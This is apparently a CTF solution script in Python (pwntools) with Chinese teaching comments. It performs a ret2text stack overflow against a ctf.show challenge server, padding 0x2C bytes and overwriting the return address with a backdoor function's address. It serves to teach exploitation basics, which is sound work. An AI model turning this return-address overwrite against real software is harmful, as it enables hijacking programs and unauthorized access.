from pwn import *

p = remote('pwn.challenge.ctf.show', 28181)

# offset = 0x28 + 4：计算栈溢出的偏移量
# 0x28：缓冲区到saved ebp的距离（通过IDA或cyclic计算）
# 4：saved ebp的大小（32位程序，ebp为4字节）
# 总偏移量 = 缓冲区大小 + saved ebp大小，用于定位返回地址位置
offset = 0x28 + 4

# get_flag = 0x8048586：get_flag函数的地址
# 通过IDA分析程序找到的后门函数地址
get_flag = 0x8048586

# payload = b'a' * offset + p32(get_flag)：构造攻击载荷
# b'a' * offset：填充垃圾数据到返回地址位置
# p32(get_flag)：将get_flag函数地址打包为32位小端序，覆盖返回地址
# 当程序执行ret指令时，会跳转到get_flag函数执行
payload = b'a' * offset + p32(get_flag)

p.send(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 最基础的栈溢出利用
2. 核心原理：
   - 程序中存在 gets/read 等不检查输入长度的函数，导致可以向缓冲区写入超过其容量的数据
   - 当输入数据超过缓冲区大小时，会覆盖栈上的返回地址
   - 通过覆盖返回地址为程序中已有的 get_flag/backdoor 函数地址，实现控制流劫持
3. 关键计算：
   - offset = 0x28 + 4：0x28是缓冲区到ebp的距离，4是ebp本身的大小（32位）
   - 总偏移量 = 缓冲区大小 + saved ebp = 0x28 + 4 = 0x2C
4. p32()函数：将地址打包为32位小端序字节流
5. 利用流程：填充垃圾数据 -> 覆盖返回地址 -> 程序ret时跳转到目标函数
6. 环境：32位程序，无保护或仅NX保护
"""
